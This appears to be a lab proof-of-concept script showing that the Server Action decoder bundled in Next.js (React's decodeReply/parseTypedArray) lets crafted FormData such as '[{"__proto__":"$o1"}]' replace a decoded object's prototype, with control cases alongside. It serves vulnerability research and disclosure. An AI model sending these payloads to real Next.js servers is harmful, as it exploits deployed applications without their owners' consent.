/**
 * parseTypedArray()'s __proto__ guard checks the wrong variable.
 *
 * react-server-dom-webpack-server.node.production.js:
 *
 *   function parseTypedArray(response, reference, constructor, bytesPerElement,
 *                            parentObject, parentKey, referenceArrayRoot) {
 *     ...
 *     var key = response._prefix + reference;      // <- local `key` = formData field name
 *     ...
 *     "__proto__" !== key && (parentObject[parentKey] = resolvedValue);
 *
 * The guard tests `key` (always "<prefix><n>") but the assignment writes
 * `parentKey`, which comes from the model and is attacker-controlled.
 *
 * Compare resolveReference(), which gets it right:
 *   "__proto__" !== key && (parentObject[key] = resolvedValue);
 *
 * This drives decodeReply() -- the Server Action ARGUMENT decoder -- directly.
 */
import { createRequire } from 'node:module'
const require = createRequire(import.meta.url)

const mod = require(
  '/home/user/nextlab/node_modules/next/dist/compiled/react-server-dom-webpack/server.node.js'
)
const { decodeReply } = mod

function makeBody(rootJson, blobBytes) {
  const fd = new FormData()
  fd.append('0', rootJson)
  if (blobBytes) fd.append('1', new Blob([blobBytes]))
  return fd
}

const manifest = {} // never consulted: no $F / $h in these payloads

async function run(label, rootJson, bytes) {
  const before = Object.prototype.polluted
  try {
    const args = await decodeReply(makeBody(rootJson, bytes), manifest)
    const arg = args[0]
    const proto = Object.getPrototypeOf(arg)
    console.log(`\n--- ${label} ---`)
    console.log('  root JSON        :', rootJson)
    console.log('  decoded arg      :', Object.prototype.toString.call(arg))
    console.log('  own keys         :', JSON.stringify(Object.keys(arg)))
    console.log('  prototype is     :', Object.prototype.toString.call(proto))
    console.log('  proto === Object.prototype ?', proto === Object.prototype)
    if (proto !== Object.prototype && proto !== null) {
      console.log('  *** prototype was REPLACED by decoded value ***')
      console.log('  ctor of proto    :', proto?.constructor?.name)
      console.log('  arg[0] (inherited from the typed array):', arg[0])
    }
    console.log('  Object.prototype.polluted changed?',
      Object.prototype.polluted !== before)
  } catch (e) {
    console.log(`\n--- ${label} ---`)
    console.log('  threw:', e.message.slice(0, 160))
  }
}

console.log('next:', require('/home/user/nextlab/node_modules/next/package.json').version)

// $A = ArrayBuffer, $o = Uint8Array. "1" is the blob-bearing field.
await run('__proto__ := Uint8Array ($o1)',
  '[{"__proto__":"$o1"}]', new Uint8Array([65, 66, 67, 68]))

await run('__proto__ := ArrayBuffer ($A1)',
  '[{"__proto__":"$A1"}]', new Uint8Array([1, 2, 3, 4]))

// control: the correctly-guarded path (resolveReference) refuses the same key
await run('control: __proto__ := outlined model ($1)',
  '[{"__proto__":"$1"}]', null)

// control: an ordinary key on the same typed-array path must still work
await run('control: normal key := Uint8Array',
  '[{"benign":"$o1"}]', new Uint8Array([9, 9]))
